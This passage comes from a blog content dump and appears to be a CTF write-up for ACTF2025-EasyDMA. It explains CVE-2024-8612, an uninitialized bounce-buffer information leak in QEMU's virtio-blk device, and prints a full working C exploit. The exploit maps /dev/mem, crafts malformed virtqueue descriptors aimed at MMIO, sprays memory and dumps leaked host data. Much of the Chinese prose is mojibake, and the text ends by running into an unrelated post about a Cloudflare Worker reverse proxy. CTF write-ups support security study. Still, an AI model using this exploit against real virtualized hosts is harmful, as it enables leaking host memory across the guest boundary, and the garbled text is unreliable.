min_io_sizeÍ¾        // optimal (suggested maximum) I/O size in blocks        le32 opt_io_sizeÍ¾    } topologyÍ¾    u8 writebackÍ¾    u8 unused0Í¾    u16 num_queuesÍ¾    le32 max_discard_sectorsÍ¾    le32 max_discard_segÍ¾    le32 discard_sector_alignmentÍ¾    le32 max_write_zeroes_sectorsÍ¾    le32 max_write_zeroes_segÍ¾    u8 write_zeroes_may_unmapÍ¾    u8 unused1[3]Í¾    le32 max_secure_erase_sectorsÍ¾    le32 max_secure_erase_segÍ¾    le32 secure_erase_sector_alignmentÍ¾    struct virtio_blk_zoned_characteristics {        le32 zone_sectorsÍ¾        le32 max_open_zonesÍ¾        le32 max_active_zonesÍ¾        le32 max_append_sectorsÍ¾        le32 write_granularityÍ¾        u8 modelÍ¾        u8 unused2[3]Í¾    } zonedÍ¾}Í¾\nInitialization\n\nRead capabilities\nReset device\nReset Virtqueue\n\nvoid init_virtio() {    int fd = open(\"/sys/devices/pci0000:00/0000:00:04.0/config\", O_RDONLY);    if(fd &lt; 0){        ERR(\"Open virtio config\");    }    struct virtio_pci_cap cap;    char* config = malloc(0x1000);    int bytes_read = read(fd, config, 0x1000);    if(bytes_read &lt; 0){        ERR(\"Read virtio config\");    }    fd = open(\"/sys/devices/pci0000:00/0000:00:04.0/resource4\", O_RDWR | O_SYNC);    if(fd &lt; 0){        ERR(\"Open virtio resource4\");    }    virtio_mmio = mmap(0, 0x4000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);    if(virtio_mmio == (volatile void*)-1){        ERR(\"mmap virtio mem\");    }    close(fd);    u8 cap_ptr = *(u8*)(config+0x34);    while(cap_ptr != 0){        if(config[cap_ptr] != 0x9){            cap_ptr = *(u8*)(config+cap_ptr+1);            continue;        }        memcpy(&amp;cap, config+cap_ptr, sizeof(cap));        print_cap(&amp;cap);        switch(cap.cfg_type){            case VIRTIO_PCI_CAP_COMMON_CFG:                virtio_common_mmio = virtio_mmio + cap.offset;                break;            case VIRTIO_PCI_CAP_NOTIFY_CFG:                virtio_notify_mmio = (struct virtio_notify_cfg*)((size_t)virtio_mmio + cap.offset);                break;            case VIRTIO_PCI_CAP_ISR_CFG:                virtio_isr_mmio = virtio_mmio + cap.offset;                break;            case VIRTIO_PCI_CAP_DEVICE_CFG:                virtio_device_mmio = virtio_mmio + cap.offset;                break;            default:                break;        }        cap_ptr = cap.cap_next;    }    close(fd);    free(config);    struct virtio_pci_common_cfg* common_cfg = (struct virtio_pci_common_cfg*)virtio_common_mmio;    mmio_write32(&amp;common_cfg-&gt;device_feature_select, 0);    printf(\"device_feature[0]: %x\\n\", mmio_read32(&amp;common_cfg-&gt;device_feature));    mmio_write32(&amp;common_cfg-&gt;device_feature_select, 1);    printf(\"device_feature[1]: %x\\n\", mmio_read32(&amp;common_cfg-&gt;device_feature));    mmio_write32(&amp;common_cfg-&gt;driver_feature_select, 0);    printf(\"driver_feature[0]: %x\\n\", mmio_read32(&amp;common_cfg-&gt;driver_feature));    mmio_write32(&amp;common_cfg-&gt;driver_feature_select, 1);    printf(\"driver_feature[1]: %x\\n\", mmio_read32(&amp;common_cfg-&gt;driver_feature));    struct virtio_blk_config* blk_cfg = (struct virtio_blk_config*)virtio_device_mmio;    printf(\"capacity: %lx\\n\", mmio_read64(&amp;blk_cfg-&gt;capacity));    printf(\"size_max: %x\\n\", mmio_read32(&amp;blk_cfg-&gt;size_max));    printf(\"seg_max: %x\\n\", mmio_read32(&amp;blk_cfg-&gt;seg_max));    printf(\"geometry.cylinders: %x\\n\", mmio_read16(&amp;blk_cfg-&gt;geometry.cylinders));    printf(\"geometry.heads: %x\\n\", mmio_read8(&amp;blk_cfg-&gt;geometry.heads));    printf(\"geometry.sectors: %x\\n\", mmio_read8(&amp;blk_cfg-&gt;geometry.sectors));    printf(\"blk_size: %x\\n\", mmio_read32(&amp;blk_cfg-&gt;blk_size));    // reset device    mmio_write8(&amp;common_cfg-&gt;device_status, 0);    mmio_write8(&amp;common_cfg-&gt;device_status, VIRTIO_CONFIG_S_ACKNOWLEDGE);    mmio_write8(&amp;common_cfg-&gt;device_status, VIRTIO_CONFIG_S_DRIVER | VIRTIO_CONFIG_S_ACKNOWLEDGE);    mmio_write32(&amp;common_cfg-&gt;driver_feature_select, 0);    mmio_write32(&amp;common_cfg-&gt;driver_feature, 0); // disable all features    mmio_write8(&amp;common_cfg-&gt;device_status, VIRTIO_CONFIG_S_FEATURES_OK | VIRTIO_CONFIG_S_DRIVER | VIRTIO_CONFIG_S_ACKNOWLEDGE);    assert(mmio_read8(&amp;common_cfg-&gt;device_status) &amp; VIRTIO_CONFIG_S_FEATURES_OK);    // alloc dma memory    int dma_fd = open(\"/dev/mem\", O_RDWR | O_SYNC);    if(dma_fd &lt; 0){        ERR(\"Open dma\");    }    dma_mem = mmap((void*)0x3ffdd000, 0x3000, PROT_READ | PROT_WRITE, MAP_SHARED, dma_fd, 0x3ffdd000);    if(dma_mem == (volatile void*)-1){        ERR(\"mmap dma mem\");    }    *(volatile uint32_t*)dma_mem = 0x12345678;    printf(\"%x\\n\", *(volatile uint32_t*)dma_mem);    *(volatile uint32_t*)dma_mem = 0;    printf(\"dma_mem: %p\\n\", dma_mem);    dma_data = dma_mem + 0x1000;    queue_desc = (struct virtq_desc*)dma_mem;    queue_avail = (struct virtq_avail*)((char*)queue_desc + 0x10 * VIRTIO_QUEUE_SIZE);    queue_used = (struct virtq_used*)((char*)dma_mem + 0x200);    // init queue    mmio_write16(&amp;common_cfg-&gt;queue_select, 0);    mmio_write16(&amp;common_cfg-&gt;queue_size, VIRTIO_QUEUE_SIZE);    mmio_write64(&amp;common_cfg-&gt;queue_desc, (size_t)0x3ffdd000);    mmio_write64(&amp;common_cfg-&gt;queue_driver, (size_t)0x3ffdd100);    mmio_write64(&amp;common_cfg-&gt;queue_device, (size_t)0x3ffdd200);    mmio_write16(&amp;common_cfg-&gt;queue_enable, 1);    mmio_write8(&amp;common_cfg-&gt;device_status, VIRTIO_CONFIG_S_DRIVER_OK | VIRTIO_CONFIG_S_FEATURES_OK | VIRTIO_CONFIG_S_DRIVER | VIRTIO_CONFIG_S_ACKNOWLEDGE);    puts(\"virtio init done\");}\nVulnerabilities\nCVE-2024-8612\nä»æ–‡ä»¶çš„å­—ç¬¦ä¸²ä¸­å¯å¾—çŸ¥ qemu çš„ç‰ˆæœ¬å·ä¸º qemu-8.0.0-rc2ï¼Œå­˜åœ¨ä¸€ä¸ªå…³äº virtio-blk-pci çš„ä¿¡æ¯æ³„æ¼æ¼æ´:\nCVE-2024-8612\nå…·ä½“åˆ©ç”¨è¿˜å¯ä»¥å‚è€ƒ:\nHEXACON2024 -\nDMAKiller: DMA to Escape from QEMU/KVM by Yongkang Jia, Yiming Tao &amp;\nXiao Lei,\nACTF2025-EasyDMA\nWriteup\nå½“ DMA è®¿é—®çš„åœ°å€æ˜¯ MMIO çš„ï¼Œä¼šä½¿ç”¨ bounce buffer\n/* Map a physical memory region into a host virtual address. * May map a subset of the requested range, given by and returned in *plen. * May return NULL if resources needed to perform the mapping are exhausted. * Use only for reads OR writes - not for read-modify-write operations. * Use cpu_register_map_client() to know when retrying the map operation is * likely to succeed. */void *address_space_map(AddressSpace *as,                        hwaddr addr,                        hwaddr *plen,                        bool is_write,                        MemTxAttrs attrs){    hwaddr len = *plen;    hwaddr l, xlat;    MemoryRegion *mr;    FlatView *fv;    if (len == 0) {        return NULL;    }    l = len;    RCU_READ_LOCK_GUARD();    fv = address_space_to_flatview(as);    mr = flatview_translate(fv, addr, &amp;xlat, &amp;l, is_write, attrs);    if (!memory_access_is_direct(mr, is_write)) {        if (qatomic_xchg(&amp;bounce.in_use, true)) {            *plen = 0;            return NULL;        }               /* Avoid unbounded allocations */        l = MIN(l, TARGET_PAGE_SIZE);        bounce.buffer = qemu_memalign(TARGET_PAGE_SIZE, l);        bounce.addr = addr;        bounce.len = l;        memory_region_ref(mr);        bounce.mr = mr;        if (!is_write) {            flatview_read(fv, addr, MEMTXATTRS_UNSPECIFIED,                               bounce.buffer, l);        }        *plen = l;        return bounce.buffer;    }\t//...}\nåŒæ—¶ï¼Œé€šè¿‡ qemu_memalign å¾—åˆ°çš„å†…å­˜å¹¶æ²¡æœ‰åˆå§‹åŒ–ã€‚\nstatic int virtio_blk_handle_request(VirtIOBlockReq *req, MultiReqBuffer *mrb){    uint32_t type;    struct iovec *in_iov = req-&gt;elem.in_sg;    struct iovec *out_iov = req-&gt;elem.out_sg;    unsigned in_num = req-&gt;elem.in_num;    unsigned out_num = req-&gt;elem.out_num;    VirtIOBlock *s = req-&gt;dev;    VirtIODevice *vdev = VIRTIO_DEVICE(s);        if (req-&gt;elem.out_num &lt; 1 || req-&gt;elem.in_num &lt; 1) {        virtio_error(vdev, \"virtio-blk missing headers\");        return -1;    }    if (unlikely(iov_to_buf(out_iov, out_num, 0, &amp;req-&gt;out,                            sizeof(req-&gt;out)) != sizeof(req-&gt;out))) {        virtio_error(vdev, \"virtio-blk request outhdr too short\");        return -1;    }    iov_discard_front_undoable(&amp;out_iov, &amp;out_num, sizeof(req-&gt;out),                               &amp;req-&gt;outhdr_undo);    if (in_iov[in_num - 1].iov_len &lt; sizeof(struct virtio_blk_inhdr)) {        virtio_error(vdev, \"virtio-blk request inhdr too short\");        iov_discard_undo(&amp;req-&gt;outhdr_undo);        return -1;    }        //...        req-&gt;in_len = iov_size(in_iov, in_num);        //...        case VIRTIO_BLK_T_IN:    {        bool is_write = type &amp; VIRTIO_BLK_T_OUT;        req-&gt;sector_num = virtio_ldq_p(vdev, &amp;req-&gt;out.sector);        if (is_write) {            qemu_iovec_init_external(&amp;req-&gt;qiov, out_iov, out_num);            trace_virtio_blk_handle_write(vdev, req, req-&gt;sector_num,                                          req-&gt;qiov.size / BDRV_SECTOR_SIZE);        } else {            qemu_iovec_init_external(&amp;req-&gt;qiov, in_iov, in_num);            trace_virtio_blk_handle_read(vdev, req, req-&gt;sector_num,                                         req-&gt;qiov.size / BDRV_SECTOR_SIZE);        }        if (!virtio_blk_sect_range_ok(s, req-&gt;sector_num, req-&gt;qiov.size)) {            virtio_blk_req_complete(req, VIRTIO_BLK_S_IOERR);            block_acct_invalid(blk_get_stats(s-&gt;blk),                               is_write ? BLOCK_ACCT_WRITE : BLOCK_ACCT_READ);            virtio_blk_free_request(req);            return 0;        }        \t//...    default:    virtio_blk_req_complete(req, VIRTIO_BLK_S_UNSUPP);    virtio_blk_free_request(req);        }\nåœ¨ virtio_blk_handle_requestï¼Œå³ä½¿è¯·æ±‚ä¸åˆæ³•ï¼Œé•¿åº¦ä¹Ÿè¢«å†™å…¥åˆ° req-&gt;in_lenã€‚type ä¸åˆæ³•æ—¶ï¼Œç›´æ¥è°ƒç”¨ virtio_blk_req_complete\nè°ƒç”¨é“¾ï¼švirtio_blk_handle_request-&gt;virtio_blk_req_complete-&gt;virtqueue_push-&gt;virtqueue_fill-&gt;virtqueue_unmap_sg-&gt;dma_memory_unmap-&gt;address_space_unmap-&gt;address_space_write\nMemTxResult address_space_write(AddressSpace *as, hwaddr addr,                                MemTxAttrs attrs,                                const void *buf, int len){    MemTxResult result;    __bufread(buf, len);    return result;}\nç”±äºç¼ºä¹ä¿æŠ¤ï¼Œæ•°æ®å¯ä»¥è¢«å†™åˆ° Common\nconfiguration éƒ¨åˆ†ï¼Œå¹¶ä¸”éƒ¨åˆ†ç©ºé—´å¯è¢«è¯»å‡ºã€‚\nExploit\né€šè¿‡å †å–·ï¼Œå°† flag å­—ç¬¦ä¸²å¡«å……åœ¨å†…å­˜ä¸­ã€‚åˆ©ç”¨ä¸Šè¿°æ¼æ´è¯»å‡ºå†…å­˜å†…å®¹ã€‚\n#include&lt;stddef.h&gt;#include&lt;stdlib.h&gt;#include&lt;unistd.h&gt;#include&lt;fcntl.h&gt;#include&lt;sys/mman.h&gt;#include&lt;string.h&gt;#include&lt;stdio.h&gt;#include&lt;assert.h&gt;#include&lt;stdint.h&gt;#include&lt;sys/io.h&gt;#include&lt;linux/stddef.h&gt;#define u8 uint8_t#define u16 uint16_t#define u32 uint32_t#define u64 uint64_t#define le16 u16#define le32 u32#define le64 u64struct virtio_pci_cap {    u8 cap_vndr;    u8 cap_next;    u8 cap_len;    u8 cfg_type;    u8 bar;    u8 id;    u8 padding[2];    le32 offset;    le32 length;};struct virtio_pci_common_cfg {    /* About the whole device. */    le32 device_feature_select; /* read-write */    le32 device_feature; /* read-only for driver */    le32 driver_feature_select; /* read-write */    le32 driver_feature; /* read-write */    le16 config_msix_vector; /* read-write */    le16 num_queues; /* read-only for driver */    u8 device_status; /* read-write */    u8 config_generation; /* read-only for driver */    /* About a specific virtqueue. */    le16 queue_select; /* read-write */    le16 queue_size; /* read-write */    le16 queue_msix_vector; /* read-write */    le16 queue_enable; /* read-write */    le16 queue_notify_off; /* read-only for driver */    le64 queue_desc; /* read-write */    le64 queue_driver; /* read-write */    le64 queue_device; /* read-write */    le16 queue_notify_data; /* read-only for driver */    le16 queue_reset; /* read-write */};struct virtio_notify_cfg {    struct virtio_pci_cap cap;    le32 notify_off_multiplier;};struct virtio_blk_config{    le64 capacity;    le32 size_max;    le32 seg_max;    struct virtio_blk_geometry {        le16 cylinders;        u8 heads;        u8 sectors;    } geometry;    le32 blk_size;    struct virtio_blk_topology {        // # of logical blocks per physical block (log2)        u8 physical_block_exp;        // offset of first aligned logical block        u8 alignment_offset;        // suggested minimum I/O size in blocks        le16 min_io_size;        // optimal (suggested maximum) I/O size in blocks        le32 opt_io_size;    } topology;    u8 writeback;    u8 unused0;    u16 num_queues;    le32 max_discard_sectors;    le32 max_discard_seg;    le32 discard_sector_alignment;    le32 max_write_zeroes_sectors;    le32 max_write_zeroes_seg;    u8 write_zeroes_may_unmap;    u8 unused1[3];    le32 max_secure_erase_sectors;    le32 max_secure_erase_seg;    le32 secure_erase_sector_alignment;};enum virtio_pci_cfg_type{    VIRTIO_PCI_CAP_COMMON_CFG = 0x1,    VIRTIO_PCI_CAP_NOTIFY_CFG = 0x2,    VIRTIO_PCI_CAP_ISR_CFG = 0x3,    VIRTIO_PCI_CAP_DEVICE_CFG = 0x4,    VIRTIO_PCI_CAP_PCI_CFG = 0x5,    VIRTIO_PCI_CAP_SHARED_MEMORY = 0x8,    VIRTIO_PCI_CAP_VENDOR_CFG = 0x9,};/* Feature bits */#define VIRTIO_BLK_F_SIZE_MAX\t1\t/* Indicates maximum segment size */#define VIRTIO_BLK_F_SEG_MAX\t2\t/* Indicates maximum # of segments */#define VIRTIO_BLK_F_GEOMETRY\t4\t/* Legacy geometry available  */#define VIRTIO_BLK_F_RO\t\t5\t/* Disk is read-only */#define VIRTIO_BLK_F_BLK_SIZE\t6\t/* Block size of disk is available*/#define VIRTIO_BLK_F_FLUSH\t9\t/* Flush command supported */#define VIRTIO_BLK_F_TOPOLOGY\t10\t/* Topology information is available */#define VIRTIO_BLK_F_MQ\t\t12\t/* support more than one vq */#define VIRTIO_BLK_F_DISCARD\t13\t/* DISCARD is supported */#define VIRTIO_BLK_F_WRITE_ZEROES\t14\t/* WRITE ZEROES is supported */#define VIRTIO_BLK_F_SECURE_ERASE\t16 /* Secure Erase is supported *//* Status byte for guest to report progress, and synchronize features. *//* We have seen device and processed generic fields (VIRTIO_CONFIG_F_VIRTIO) */#define VIRTIO_CONFIG_S_ACKNOWLEDGE\t1/* We have found a driver for the device. */#define VIRTIO_CONFIG_S_DRIVER\t\t2/* Driver has used its parts of the config, and is happy */#define VIRTIO_CONFIG_S_DRIVER_OK\t4/* Driver has finished configuring features */#define VIRTIO_CONFIG_S_FEATURES_OK\t8/* Device entered invalid state, driver must reset it */#define VIRTIO_CONFIG_S_NEEDS_RESET\t0x40/* We've given up on this device. */#define VIRTIO_CONFIG_S_FAILED\t\t0x80#define VIRTIO_QUEUE_SIZE 0x10struct virtq_desc {    /* Address (guest-physical). */    le64 addr;    /* Length. */    le32 len;/* This marks a buffer as continuing via the next field. */#define VIRTQ_DESC_F_NEXT 1/* This marks a buffer as device write-only (otherwise device read-only). */#define VIRTQ_DESC_F_WRITE 2/* This means the buffer contains a list of buffer descriptors. */#define VIRTQ_DESC_F_INDIRECT 4    /* The flags as indicated above. */    le16 flags;    /* Next field if flags &amp; NEXT */    le16 next;};struct virtq_avail {#define VIRTQ_AVAIL_F_NO_INTERRUPT 1    le16 flags;    le16 idx;    le16 ring[VIRTIO_QUEUE_SIZE];    le16 used_event; /* Only if VIRTIO_F_EVENT_IDX */};struct virtq_used_elem {    /* Index of start of used descriptor chain. */    le32 id;    /*    * The number of bytes written into the device writable portion of    * the buffer described by the descriptor chain.    */    le32 len;};struct virtq_used {#define VIRTQ_USED_F_NO_NOTIFY 1    le16 flags;    le16 idx;    struct virtq_used_elem ring[VIRTIO_QUEUE_SIZE];    le16 avail_event; /* Only if VIRTIO_F_EVENT_IDX */};struct virtio_blk_req {    le32 type;    le32 reserved;    le64 sector;    u8 data[0];    // u8 status;};#define VIRTIO_BLK_T_IN 0#define VIRTIO_BLK_T_OUT 1#define VIRTIO_BLK_T_FLUSH 4#define VIRTIO_BLK_T_GET_ID 8#define VIRTIO_BLK_T_GET_LIFETIME 10#define VIRTIO_BLK_T_DISCARD 11#define VIRTIO_BLK_T_WRITE_ZEROES 13#define VIRTIO_BLK_T_SECURE_ERASE 14void print_cap(struct virtio_pci_cap* cap){    printf(\"cap_len: %x\\n\", cap-&gt;cap_len);    switch(cap-&gt;cfg_type){        case VIRTIO_PCI_CAP_COMMON_CFG:            printf(\"cfg_type: common\\n\");            break;        case VIRTIO_PCI_CAP_NOTIFY_CFG:            printf(\"cfg_type: notify\\n\");            break;        case VIRTIO_PCI_CAP_ISR_CFG:            printf(\"cfg_type: isr\\n\");            break;        case VIRTIO_PCI_CAP_DEVICE_CFG:            printf(\"cfg_type: device\\n\");            break;        case VIRTIO_PCI_CAP_PCI_CFG:            printf(\"cfg_type: pci\\n\");            break;        case VIRTIO_PCI_CAP_SHARED_MEMORY:            printf(\"cfg_type: shared memory\\n\");            break;        case VIRTIO_PCI_CAP_VENDOR_CFG:            printf(\"cfg_type: vendor\\n\");            break;        default:            printf(\"cfg_type: unknown\\n\");            break;    }    printf(\"bar: %x\\n\", cap-&gt;bar);    printf(\"id: %x\\n\", cap-&gt;id);    printf(\"offset: %x\\n\", cap-&gt;offset);    printf(\"length: %x\\n\", cap-&gt;length);}void ERR(const char* buf){    perror(buf);    abort();}void LOG(const char* buf){    write(2, buf, strlen(buf));}volatile char* readflag_mmio = NULL;volatile char* virtio_mmio = NULL;volatile char* virtio_common_mmio = NULL;volatile struct virtio_notify_cfg* virtio_notify_mmio = NULL;volatile char* virtio_isr_mmio = NULL;volatile char* virtio_device_mmio = NULL;volatile char* dma_mem = NULL;volatile char* dma_data = NULL;volatile struct virtq_desc* queue_desc = NULL;volatile struct virtq_avail* queue_avail = NULL;volatile struct virtq_used* queue_used = NULL;void init_readflag(){    int mmio_fd = open(\"/sys/devices/pci0000:00/0000:00:05.0/resource0\", O_RDWR | O_SYNC);    if(mmio_fd &lt; 0){        ERR(\"Open readflag\");    }    readflag_mmio = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);    if(readflag_mmio == (volatile void*)-1){        ERR(\"mmap mmio_mem\");    }    close(mmio_fd);    puts(\"readflag init done\");}uint8_t mmio_read8(void* addr){    return *(volatile uint8_t*)addr;}uint16_t mmio_read16(void* addr){    return *(volatile uint16_t*)addr;}uint32_t mmio_read32(void* addr){    return *(volatile uint32_t*)addr;}uint64_t mmio_read64(void* addr){    return *(volatile uint64_t*)addr;}void mmio_write8(void* addr, uint8_t val){    *(volatile uint8_t*)addr = val;}void mmio_write16(void* addr, uint16_t val){    *(volatile uint16_t*)addr = val;}void mmio_write32(void* addr, uint32_t val){    *(volatile uint32_t*)addr = val;}void mmio_write64(void* addr, uint64_t val){    *(volatile uint64_t*)addr = val;}void mb(){    asm volatile(\"mfence\":::\"memory\");}void init_virtio() {    int fd = open(\"/sys/devices/pci0000:00/0000:00:04.0/config\", O_RDONLY);    if(fd &lt; 0){        ERR(\"Open virtio config\");    }    struct virtio_pci_cap cap;    char* config = malloc(0x1000);    int bytes_read = read(fd, config, 0x1000);    if(bytes_read &lt; 0){        ERR(\"Read virtio config\");    }    fd = open(\"/sys/devices/pci0000:00/0000:00:04.0/resource4\", O_RDWR | O_SYNC);    if(fd &lt; 0){        ERR(\"Open virtio resource4\");    }    virtio_mmio = mmap(0, 0x4000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);    if(virtio_mmio == (volatile void*)-1){        ERR(\"mmap virtio mem\");    }    close(fd);    u8 cap_ptr = *(u8*)(config+0x34);    while(cap_ptr != 0){        if(config[cap_ptr] != 0x9){            cap_ptr = *(u8*)(config+cap_ptr+1);            continue;        }        memcpy(&amp;cap, config+cap_ptr, sizeof(cap));        print_cap(&amp;cap);        switch(cap.cfg_type){            case VIRTIO_PCI_CAP_COMMON_CFG:                virtio_common_mmio = virtio_mmio + cap.offset;                break;            case VIRTIO_PCI_CAP_NOTIFY_CFG:                virtio_notify_mmio = (struct virtio_notify_cfg*)((size_t)virtio_mmio + cap.offset);                break;            case VIRTIO_PCI_CAP_ISR_CFG:                virtio_isr_mmio = virtio_mmio + cap.offset;                break;            case VIRTIO_PCI_CAP_DEVICE_CFG:                virtio_device_mmio = virtio_mmio + cap.offset;                break;            default:                break;        }        cap_ptr = cap.cap_next;    }    close(fd);    free(config);    struct virtio_pci_common_cfg* common_cfg = (struct virtio_pci_common_cfg*)virtio_common_mmio;    mmio_write32(&amp;common_cfg-&gt;device_feature_select, 0);    printf(\"device_feature[0]: %x\\n\", mmio_read32(&amp;common_cfg-&gt;device_feature));    mmio_write32(&amp;common_cfg-&gt;device_feature_select, 1);    printf(\"device_feature[1]: %x\\n\", mmio_read32(&amp;common_cfg-&gt;device_feature));    mmio_write32(&amp;common_cfg-&gt;driver_feature_select, 0);    printf(\"driver_feature[0]: %x\\n\", mmio_read32(&amp;common_cfg-&gt;driver_feature));    mmio_write32(&amp;common_cfg-&gt;driver_feature_select, 1);    printf(\"driver_feature[1]: %x\\n\", mmio_read32(&amp;common_cfg-&gt;driver_feature));    struct virtio_blk_config* blk_cfg = (struct virtio_blk_config*)virtio_device_mmio;    printf(\"capacity: %lx\\n\", mmio_read64(&amp;blk_cfg-&gt;capacity));    printf(\"size_max: %x\\n\", mmio_read32(&amp;blk_cfg-&gt;size_max));    printf(\"seg_max: %x\\n\", mmio_read32(&amp;blk_cfg-&gt;seg_max));    printf(\"geometry.cylinders: %x\\n\", mmio_read16(&amp;blk_cfg-&gt;geometry.cylinders));    printf(\"geometry.heads: %x\\n\", mmio_read8(&amp;blk_cfg-&gt;geometry.heads));    printf(\"geometry.sectors: %x\\n\", mmio_read8(&amp;blk_cfg-&gt;geometry.sectors));    printf(\"blk_size: %x\\n\", mmio_read32(&amp;blk_cfg-&gt;blk_size));    // reset device    mmio_write8(&amp;common_cfg-&gt;device_status, 0);    mmio_write8(&amp;common_cfg-&gt;device_status, VIRTIO_CONFIG_S_ACKNOWLEDGE);    mmio_write8(&amp;common_cfg-&gt;device_status, VIRTIO_CONFIG_S_DRIVER | VIRTIO_CONFIG_S_ACKNOWLEDGE);    mmio_write32(&amp;common_cfg-&gt;driver_feature_select, 0);    mmio_write32(&amp;common_cfg-&gt;driver_feature, 0); // disable all features    mmio_write8(&amp;common_cfg-&gt;device_status, VIRTIO_CONFIG_S_FEATURES_OK | VIRTIO_CONFIG_S_DRIVER | VIRTIO_CONFIG_S_ACKNOWLEDGE);    assert(mmio_read8(&amp;common_cfg-&gt;device_status) &amp; VIRTIO_CONFIG_S_FEATURES_OK);    // alloc dma memory    int dma_fd = open(\"/dev/mem\", O_RDWR | O_SYNC);    if(dma_fd &lt; 0){        ERR(\"Open dma\");    }    dma_mem = mmap((void*)0x3ffdd000, 0x3000, PROT_READ | PROT_WRITE, MAP_SHARED, dma_fd, 0x3ffdd000);    if(dma_mem == (volatile void*)-1){        ERR(\"mmap dma mem\");    }    *(volatile uint32_t*)dma_mem = 0x12345678;    printf(\"%x\\n\", *(volatile uint32_t*)dma_mem);    *(volatile uint32_t*)dma_mem = 0;    printf(\"dma_mem: %p\\n\", dma_mem);    dma_data = dma_mem + 0x1000;    queue_desc = (struct virtq_desc*)dma_mem;    queue_avail = (struct virtq_avail*)((char*)queue_desc + 0x10 * VIRTIO_QUEUE_SIZE);    queue_used = (struct virtq_used*)((char*)dma_mem + 0x200);    // init queue    mmio_write16(&amp;common_cfg-&gt;queue_select, 0);    mmio_write16(&amp;common_cfg-&gt;queue_size, VIRTIO_QUEUE_SIZE);    mmio_write64(&amp;common_cfg-&gt;queue_desc, (size_t)0x3ffdd000);    mmio_write64(&amp;common_cfg-&gt;queue_driver, (size_t)0x3ffdd100);    mmio_write64(&amp;common_cfg-&gt;queue_device, (size_t)0x3ffdd200);    mmio_write16(&amp;common_cfg-&gt;queue_enable, 1);    mmio_write8(&amp;common_cfg-&gt;device_status, VIRTIO_CONFIG_S_DRIVER_OK | VIRTIO_CONFIG_S_FEATURES_OK | VIRTIO_CONFIG_S_DRIVER | VIRTIO_CONFIG_S_ACKNOWLEDGE);    puts(\"virtio init done\");}void spray(){    for(int i = 0xfff; i &gt; 0x28; i-=4){        mmio_write32((void*)readflag_mmio, i);    }}void hexdump(void* addr, size_t size){    // dump 4 bytes per time    for(int i = 0; i &lt; size; i+=4){        uint32_t val = *(volatile uint32_t*)(addr+i);        for(int j = 0; j &lt; 4; j++){            uint8_t chr = (val &gt;&gt; (j*8)) &amp; 0xff;            if(chr &gt;= 0x20 &amp;&amp; chr &lt;= 0x7e){                putchar(chr);            }else{                putchar('?');            }        }    }}int main(){    setbuf(stdout, NULL);    init_readflag();    init_virtio();    volatile struct virtio_blk_req* req = (struct virtio_blk_req*)dma_data;    req-&gt;type = 0xffffffffu;    req-&gt;sector = 0;    req-&gt;reserved = 0;    queue_desc[0].addr = (size_t)req;    queue_desc[0].len = 0x10;    queue_desc[0].flags = VIRTQ_DESC_F_NEXT;    queue_desc[0].next = 1;    queue_desc[1].addr = (size_t)0xfe000000;    queue_desc[1].len = 0xfff;    queue_desc[1].flags = VIRTQ_DESC_F_WRITE | VIRTQ_DESC_F_NEXT;    queue_desc[1].next = 2;    queue_desc[2].addr = (size_t)dma_data + 0xa00;    queue_desc[2].len = 1;    queue_desc[2].flags = VIRTQ_DESC_F_WRITE;    queue_desc[2].next = 0;    queue_avail-&gt;flags = 1;    queue_avail-&gt;ring[0] = 0;    queue_avail-&gt;idx = 1;    mb();    mmio_write8((void*)virtio_isr_mmio, 1);    struct virtio_pci_common_cfg* common_cfg = (struct virtio_pci_common_cfg*)virtio_common_mmio;    void* notify_addr = (void*)((uintptr_t)virtio_notify_mmio + mmio_read32((void*)&amp;virtio_notify_mmio-&gt;cap.offset) + mmio_read16(&amp;common_cfg-&gt;queue_notify_off) * mmio_read32((void*)&amp;virtio_notify_mmio-&gt;notify_off_multiplier));    puts(\"--------------------------------\");    for(int i = 0; i &lt; 0x100; i+=4){        spray();    }    mmio_write16(notify_addr, 0);    puts(\"--------------------------------\");    hexdump((char*)virtio_common_mmio + 0x000, 0x100);    munmap(dma_mem, 0x3000);    munmap(virtio_mmio, 0x4000);    munmap(readflag_mmio, 0x1000);}\nReferences\n\n\n\nVirtual\nI/O Device (VIRTIO) Version 1.1â†©ï¸\nVirtqueues\nand virtio ring: How the data travelsâ†©ï¸\nMemory-mapped\nI/O and port-mapped I/Oâ†©ï¸\n\n\n","categories":["CTF"],"tags":["pwn","qemu","virtio","dma"]},{"title":"Cloudflare Worker åå‘ä»£ç†å°è¯•","url":"/categories/Web/cloudflare-worker-proxy/","content":"å‰è¨€\nç”±äºå‹é“¾é¡µé¢æœ‰ä½¿ç”¨å›¾ç‰‡çš„è¦æ±‚ï¼ŒåŒæ—¶ä¸ºå…¶ä»–äººçš„ç«™ç‚¹æä¾›ç›¸å…³çš„å›¾ç‰‡èµ„æºï¼ˆè™½ç„¶ä½¿ç”¨ç°æˆçš„ GitHub\nPage å°±å¯ä»¥åŸºæœ¬å®ç°ï¼Œä½†æ˜¯ Page æ‰€åœ¨çš„ä»“åº“æ˜¯å…¬å¼€çš„ï¼‰ï¼Œå°è¯•é€šè¿‡ GitHub ä½œä¸ºå›¾åºŠè§£å†³è¿™ä¸ªé—®é¢˜ã€‚ç„¶è€Œï¼Œè®¿é—®é€Ÿåº¦å’Œç¨³å®šæ€§éƒ½æ— æ³•å¾—åˆ°ä¿è¯ï¼Œä¸ºæ­¤é€šè¿‡ç½‘ä¸Šæœç´¢å­¦ä¹ äº†ä¸€ä¸‹åå‘ä»£ç†\n(Reverse Proxy) çš„ç›¸å…³çŸ¥è¯†ã€‚\n\nä»€ä¹ˆäº‹åå‘ä»£ç†\nåœ¨è¿™ä¹‹å‰ï¼Œå…ˆæ¥çœ‹çœ‹ä»€ä¹ˆæ˜¯æ­£å‘ä»£ç† 1 (Forward Proxy)ï¼š\nå®¢æˆ·ç«¯é€šè¿‡ä»£ç†æœåŠ¡å™¨å»è¯·æ±‚æœåŠ¡å™¨çš„èµ„æºã€‚\n\n\nTwo computers connected via a proxy\nserver. The first computer says to the proxy server: \"ask the second\ncomputer what the time is\".\n\nä½¿ç”¨æ­£å‘ä»£ç†éœ€è¦å®¢æˆ·ç«¯è¿›è¡Œä¸€äº›è®¾ç½®ï¼Œå³é…ç½®ä»£ç†æœåŠ¡å™¨ã€‚\nè€Œåå‘ä»£ç† 2 